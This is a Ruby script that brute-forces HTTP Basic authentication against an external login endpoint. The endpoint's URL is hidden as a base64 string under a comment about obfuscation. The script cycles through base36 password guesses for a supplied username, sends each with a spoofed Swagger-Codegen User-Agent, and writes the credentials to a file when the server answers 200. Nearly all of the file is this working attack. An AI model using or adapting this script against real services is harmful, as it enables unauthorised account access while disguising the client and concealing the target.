require 'base64';
require 'net/http';
require 'uri';
require 'json';
require 'time';

=begin
curl http://ifconfig.me
compare ip addresses
🎲 1f3b2
#rand(36**10).to_s(36) alphanum, length 10
(0..(36**3)).each {|x|print x.to_s(36)+','}
0,,z,10,,1z,20,,zz,100,,zzz,1000
=end

#ip addr obfuscation
ENCODED='aHR0cHM6Ly9sYXVuY2hlcjMwMS5jb21jYXZlLmRlOjgxODI=';#301
EXTERN_URL = Base64.decode64(ENCODED);

REGEX6 = /\A\D\d\D\d\D{6}\z/;#todo: group \A(letter_digit){2}

#sends request to server
#auth must me base64 urlsafe encoded
#returns nil or answer
def send_request(auth)
  resp = nil;
  url = URI("#{EXTERN_URL}/ping/list");
  connection = Net::HTTP.new(url.host, url.port);
  connection.use_ssl = true;

  request = Net::HTTP::Get.new(url);
  request["Authorization"]	= "Basic #{auth}"
  request["Content-Type"] 	= "application/json";
  request["User-Agent"] 	  = "Swagger-Codegen/1.2.0-SNAPSHOT/java";
  begin
    resp = connection.request(request);
  rescue StandardError => e
    #print "#{e.class} occured at: #{Time.now}";
  ensure
    return resp;
  end
end#send_request

#todo rescue ensure file close
def found(auth,resp)
  file = File.new(auth,'w+');
  file.puts(Base64.decode64(auth));
  file.close();
  #jsn = JSON.parse(resp.body);
  #pp jsn;
  #puts "\u{1f333} #{resp.to_hash}\n#{resp.code}\n"
end#found

def save_last(auth,resp)
  file = File.new(auth,'w+');
  file.puts(Base64.decode64(auth));
  file.close();
  #jsn = JSON.parse(resp.body);
  #pp jsn;
  #puts "\u{1f333} #{resp.to_hash}\n#{resp.code}\n"
end#save_last


























success = false;

user_name       = ARGV[0];#llllddd:
#base36 string
last_inspected  = ARGV[1];#cmd line arg or nil
#@user_creds = (ARGV != nil)? ARGV[0] : login_creds;
possible_pass_int = (last_inspected)? last_inspected.to_i(36) : 'a0a0aaaaaa'.to_i(36);

until success do
  possible_pass_36 = possible_pass_int.to_s(36);
  auth = Base64.urlsafe_encode64(user_name+possible_pass_36);


  t = Thread.new do
    #Thread.current[:resp] = send_request(auth);
    resp = send_request(auth);
    if (resp.code == '200')
      success = true;
      found(auth,resp);
    end
    puts "\u{1f33a} #{user_name} #{possible_pass_36}\n"#🌺
    puts "\u{1f333} #{resp.to_hash}\n#{resp.code}\n"#🌳

  end#thread

  # if (success)
  #   break;
  # end

  t.join(3);
  possible_pass_int +=1;#integer expected



































end#loop
